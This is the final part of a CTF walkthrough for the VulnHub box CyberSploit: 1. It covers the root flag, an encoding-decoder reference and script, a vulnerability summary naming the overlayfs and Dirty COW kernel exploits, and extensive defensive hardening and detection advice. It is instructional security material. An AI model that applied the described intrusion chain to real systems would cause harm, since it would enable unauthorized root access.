## 6. Flag 3 — the final flag

```bash
# cd /root
# ls -la
```

```text
total 36
drwx------  4 root root 4096 Jul  9  2020 .
drwxr-xr-x 22 root root 4096 Jul  9  2020 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-------  1 root root  220 Jul  9  2020 finalflag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwxr-xr-x  3 root root 4096 Jul  9  2020 .local
drwx------  2 root root 4096 Jul  9  2020 .ssh
# cat finalflag.txt
```

```text
Good Work!

Final Flag: cybersploit{0h_my_g0d_y0u_d1d_1t}

Thanks for playing CyberSploit: 1.
Subscribe: https://www.youtube.com/c/cybersploit
```

**All three flags captured.** ✅

| # | Flag | Where | How it was hidden |
| --- | --- | --- | --- |
| 1 | `cybersploit{youtube.com/c/cybersploit}` | `/robots.txt` | base64 |
| 2 | `cybersploit{https:t.me/cybersploit1}` | `/home/itsskv/flag2.txt` | binary (ASCII bytes) |
| 3 | `cybersploit{0h_my_g0d_y0u_d1d_1t}` | `/root/finalflag.txt` | plaintext, behind root |

*(Exact strings vary slightly by image revision.)*

![The final flag](images/07-finalflag.png)

---

## 7. Encoding reference — the skill this box is really teaching

The author named **encoder-decoder** as a learning goal. Here is the working table.

| Encoding | Looks like | Decode locally | Notes |
| --- | --- | --- | --- |
| **base64** | `A–Z a–z 0–9 + /`, length % 4, `=` padding | `base64 -d f.txt` | RFC 4648. Not encryption. |
| **base32** | `A–Z 2–7`, `=` padding | `base32 -d f.txt` | Case-insensitive alphabet |
| **base58** | `A–Z a–z 1–9` (no `0OIl`) | Bitcoin tools / Python | No padding; used by Bitcoin addresses |
| **hex** | `[0-9a-f]`, even length | `xxd -r -p f.txt` | |
| **binary** | groups of 8 `0`/`1` | `sed 's/......../0x& /g' \| xxd -r -p` | flag 2 on this box |
| **URL / percent** | `%2f`, `%20`, `%2e%2e` | `python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.stdin.read()))"` | Layer it: `%252f` → `%2f` → `/` |
| **ROT13** | letters only, shifted 13 | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | Its own inverse; zero security |
| **base64 of base64** | nested | loop `base64 -d` until it errors | Lord Of The Root, FristiLeaks |
| **HTML entities** | `&#65;`, `&amp;` | `python3 -c "import html,sys;print(html.unescape(sys.stdin.read()))"` | |
| **Unicode escape** | `\u0041` | `python3 -c "print('...'.encode().decode('unicode_escape'))"` | |

**One universal decoder script** — save this, it will serve you on dozens of boxes:

```bash
cat > decode.py <<'PY'
#!/usr/bin/env python3
"""Try every common text encoding and print anything that yields printable ASCII."""
import sys, base64, binascii, codecs, urllib.parse, html

data = sys.stdin.read().strip()
tries = {
    "base64":        lambda s: base64.b64decode(s, validate=True).decode(),
    "base64 (urlsafe)": lambda s: base64.urlsafe_b64decode(s + "==").decode(),
    "base32":        lambda s: base64.b32decode(s.upper() + "=" * (-len(s) % 8)).decode(),
    "hex":           lambda s: bytes.fromhex(s.replace(" ", "")).decode(),
    "binary":        lambda s: bytes(int(b, 2) for b in s.split()).decode(),
    "rot13":         lambda s: codecs.decode(s, "rot13"),
    "url":           lambda s: urllib.parse.unquote(s),
    "url x2":        lambda s: urllib.parse.unquote(urllib.parse.unquote(s)),
    "html":          lambda s: html.unescape(s),
    "unicode-escape":lambda s: s.encode().decode("unicode_escape"),
    "reverse":       lambda s: s[::-1],
}
found = False
for name, fn in tries.items():
    try:
        out = fn(data)
    except (binascii.Error, ValueError, UnicodeDecodeError, LookupError):
        continue
    if out and all(32 <= ord(c) < 127 or c in "\n\r\t" for c in out):
        print(f"[{name}] {out}")
        found = True
if not found:
    print("no printable decoding found — try CyberChef's 'Magic' operation")
PY
chmod +x decode.py

echo 'Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=' | ./decode.py
```

```text
[base64] cybersploit{youtube.com/c/cybersploit}
```

> **And when nothing works:** <https://gchq.github.io/CyberChef/> with the **Magic**
> operation, which auto-detects layered encodings. CyberChef is the professional's
> choice — it runs entirely in your browser, so unlike dencode/base64decode it does not
> send client data to a third party.

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Username disclosed in an HTML comment | `/index.html` | `itsskv` |
| 2 | **Encoded secret in `robots.txt`** | base64 comment | Flag 1, which doubles as the SSH password |
| 3 | **Flag/credential reused as a password** | `itsskv` SSH login | Remote foothold |
| 4 | Credential written to a world-readable file in a home directory | `flag2.txt` mode `664` | Flag 2 |
| 5 | **End-of-life operating system** | Ubuntu 14.04.6 (standard support ended April 2019) | No security updates available at all |
| 6 | **Unpatched kernel — CVE-2015-1328 (overlayfs)** | `3.13.0-32-generic` | `itsskv` → **root** |
| 7 | **Unpatched kernel — CVE-2016-5195 (Dirty COW)** | same | Alternative root |
| 8 | `gcc`, `g++`, `wget` present on a user system | `/usr/bin` | Attackers compile exploits locally |
| 9 | Deprecated 1024-bit DSA SSH host key | OpenSSH 6.6.1p1 | Weak transport crypto |
| 10 | Missing HTTP security headers; ETag leaks inode/size/mtime | Apache 2.4.7 | Minor information disclosure |
| 11 | Verbose server banner (`Apache/2.4.7 (Ubuntu)`) | Apache | Version-targeted planning |

**What this box does *not* have, deliberately:** no web application to attack, no
database, no filters to bypass, no rabbit holes. The difficulty is entirely in
*recognition* — of an encoding, and of a version range.

## 9. Defensive lessons (blue team)

1. **Retire end-of-life systems.** Ubuntu 14.04 stopped receiving standard security
   updates in **April 2019**; extended security maintenance ended in **April 2024**.
   There is no acceptable configuration of this box in 2026. Kernel `3.13.0-32` needed
   **USN-2641-1** (June 2015) for CVE-2015-1328 — it was **five years out of date**
   when this VM was released.
2. **Patch on a cadence, with a tracked exception process.** Enable automatic security
   updates:
   ```bash
   sudo apt install unattended-upgrades
   sudo dpkg-reconfigure -plow unattended-upgrades
   # /etc/apt/apt.conf.d/50unattended-upgrades
   Unattended-Upgrade::Allowed-Origins { "${distro_id}:${distro_codename}-security"; };
   Unattended-Upgrade::Automatic-Reboot "true";
   Unattended-Upgrade::Automatic-Reboot-Time "03:00";
   ```
   Then measure: how many hosts are more than 30 days behind on security patches?
3. **Restrict user namespaces** if you do not run unprivileged containers — this alone
   defeats CVE-2015-1328:
   ```text
   # /etc/sysctl.d/99-userns.conf
   kernel.unprivileged_userns_clone = 0
   user.max_user_namespaces = 0
   ```
4. **Remove build tooling from servers and, where possible, from workstations.**
   `gcc`, `g++`, `make` on a production host turn "foothold" into "root in 60 seconds".
   Build in CI; ship a signed artefact. If a compiler must exist, confine it with
   AppArmor/SELinux.
5. **Never put secrets in web-visible files.** `robots.txt` and HTML comments are
   public by definition. Scan your own site in CI:
   ```bash
   # deny-list of paths that must return 404
   for p in robots.txt .env .git/config wp-config.php.bak backup.zip id_rsa; do
       code=$(curl -s -o /dev/null -w '%{http_code}' "https://site.example/$p")
       [ "$code" != "404" ] && echo "EXPOSED: /$p -> $code"
   done
   ```
   And scan source for secrets with `gitleaks` / `trufflehog` / `detect-secrets`.
6. **Never use a flag, tagline or company string as a password.** Enforce at *set*
   time with `pam_pwquality`:
   ```text
   # /etc/security/pwquality.conf
   minlen = 14
   dictcheck = 1
   usercheck = 1
   gecoscheck = 1
   enforce_for_root
   ```
   Screen against breached lists (HaveIBeenPwned k-anonymity API), add
   `pam_faillock` (3 failures → 15-minute lockout), and prefer SSH keys:
   ```text
   # /etc/ssh/sshd_config
   PasswordAuthentication no
   PermitRootLogin no
   MaxAuthTries 3
   LoginGraceTime 20
   ```
7. **Set home-directory files to `600`.** `flag2.txt` was `664`. A default `umask 077`
   for sensitive accounts, plus a nightly sweep:
   ```bash
   find /home -xdev -type f -perm /o+r \( -iname '*cred*' -o -iname '*pass*' \
>        -o -iname '*flag*' -o -iname '*.pem' -o -iname 'id_*' \) -print
   ```
8. **Strip banners and add security headers:**
   ```apache
   ServerTokens Prod
   ServerSignature Off
   Header unset X-Powered-By
   Header always set X-Frame-Options "DENY"
   Header always set X-Content-Type-Options "nosniff"
   Header always set Content-Security-Policy "default-src 'self'"
   FileETag None
   ```
9. **Retire weak SSH host keys.** Remove 1024-bit DSA:
   ```bash
   rm -f /etc/ssh/ssh_host_dsa_key*
   # /etc/ssh/sshd_config
   HostKey /etc/ssh/ssh_host_ed25519_key
   HostKey /etc/ssh/ssh_host_rsa_key
   ```
10. **Detection opportunities.**
    - Alert on any HTTP response body from a *static* file containing a base64-looking
      token ≥ 20 characters in a comment. That pattern is almost never legitimate.
    - Alert on requests to `/robots.txt` followed by SSH login attempts from the same
      source IP — that sequence is this exact attack.
    - SSH: many failed logins then a success → `fail2ban` + SIEM correlation.
    - auditd on the overlayfs/Dirty-COW signatures:
      ```bash
      auditctl -w /etc/ld.so.preload -p wa -k ldpreload
      auditctl -w /etc/passwd -p wa -k passwd_change
      auditctl -a always,exit -F arch=b32 -S execve -F uid=1000 -k user_exec
      ```
    - Alert on `gcc`/`cc1`/`g++` execution by a non-developer account, and on `wget`
      fetching a `.c`/`.cpp` file.
    - `dmesg`/`kern.log` alerts on `BUG:`, `general protection fault`, or Dirty-COW's
      characteristic `/etc/passwd` write.

---

## 10. References

- VulnHub entry: <https://vulnhub.com/entry/cybersploit-1,506/>
- Series: <https://vulnhub.com/series/cybersploit,340/>
- Author: CyberSploit — <https://www.youtube.com/c/cybersploit>
- Community writeups consulted:
  - [adevanandh — Vulnhub: Cybersploit-1 Detailed Walkthrough](https://medium.com/@adevanandh/vulnhub-cybersploit-1-detailed-walkthrough-8fc9a4e7506a)
  - [Arun Subramanian — Cybersploit:1 vulnhub walkthrough](https://medium.com/@arunsubramanian17/cybersploit-1-vulnhub-walkthrough-1b96f8f4d8fc)
  - [pritamdas202000 — VulnHub cybersploit 1 Walkthrough](https://medium.com/@pritamdas202000/vulnhub-cybersploit-1-walkthrough-ae94cd36a63a)
  - [assume-breach — Vulnhub CyberSploit 1 Walkthrough OSCP Prep](https://assume-breach.medium.com/vulnhub-cybersploit-1-walkthrough-oscp-prep-e706d9e1f0e8)
  - [muhammedsalih886 — Cybersploit-1 Walkthrough](https://medium.com/@muhammedsalih886/cybersploit-1-walkthrough-fc8e7ac661c7)
- Exploits / advisories:
  - [CVE-2015-1328 — Ubuntu overlayfs local privilege escalation](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292) · [Launchpad bug 1507645](https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1507645) · [Ubuntu USN-2641-1](https://ubuntu.com/security/notices/USN-2641-1)
  - [CVE-2016-5195 — Dirty COW](https://dirtycow.ninja) · [Exploit-DB 40847 (x86 C++)](https://www.exploit-db.com/exploits/40847) · [Exploit-DB 40839 (x64)](https://www.exploit-db.com/exploits/40839)
- Tools / background:
  - [Exploit-DB](https://www.exploit-db.com/) and [`searchsploit` usage](https://gitlab.com/exploit-database/exploitdb#searchsploit)
  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
  - [RFC 4648 — The Base16, Base32 and Base64 Data Encodings](https://datatracker.ietf.org/doc/html/rfc4648)
  - [CyberChef](https://gchq.github.io/CyberChef/) · [dencode.com](https://dencode.com/) · [cryptii binary decoder](https://cryptii.com/pipes/binary-decoder)
  - [OverlayFS kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt)
  - [`gcc(1)` options](https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html) · [`base64(1)`](https://man7.org/linux/man-pages/man1/base64.1.html) · [`xxd(1)`](https://linux.die.net/man/1/xxd)
  - [GTFOBins](https://gtfobins.github.io) · [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

---

## 11. Screenshot checklist

- [ ] `images/01-recon.png` — `netdiscover` / `nmap -sn` finding the target
- [ ] `images/02-nmap.png` — ports 22 and 80 with the Ubuntu 14.04 banner
- [ ] `images/03-flag1.png` — `robots.txt` and the base64-decoded flag 1
- [ ] `images/04-ssh.png` — SSH as `itsskv`, showing kernel `3.13.0-32-generic`
- [ ] `images/05-flag2.png` — `flag2.txt` binary decoded
- [ ] `images/06-root.png` — `searchsploit` match, `gcc`, and `uid=0(root)`
- [ ] `images/07-finalflag.png` — `/root/finalflag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
